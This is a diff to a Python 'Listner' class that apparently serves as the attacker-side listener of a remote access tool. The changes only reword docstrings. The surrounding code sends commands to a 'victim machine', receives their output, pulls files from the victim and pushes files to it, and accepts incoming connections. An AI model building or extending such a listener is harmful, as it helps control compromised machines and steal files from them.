@@ -36,12 +36,12 @@ class Listner:
         
         
     def send(self,command,conn):
-        """A function for sending command to the victim machine""" 
+        """A function used for sending command to the victim machine""" 
         conn.send(json.dumps(command).encode())
    
     
     def recive(self,conn):
-        """A function for reciving command response from the victim machine"""
+        """A function used for reciving command response from the victim machine"""
         
         json_data = ""
         
@@ -54,14 +54,14 @@ class Listner:
       
       
     def download(self,path,data):
-        """A function for downloading a file from the victim machine"""
+        """A function used for downloading a file from the victim machine"""
         
         with open(path,'wb') as file:
             file.write(base64.b64decode(data))
             
             
     def upload(self,path):
-        """A function for uploading a file to the victim machine"""
+        """A function used for uploading a file to the victim machine"""
         
         with open(path,'rb') as file:
             return base64.b64encode(file.read())
@@ -69,7 +69,7 @@ class Listner:
     
     
     def start(self):
-        """A function for starting your listner"""
+        """A function used for starting the listner"""
         
         print('[+] Waiting for incomming connecitons.....\n')
         conn, addr = self.listner.accept()
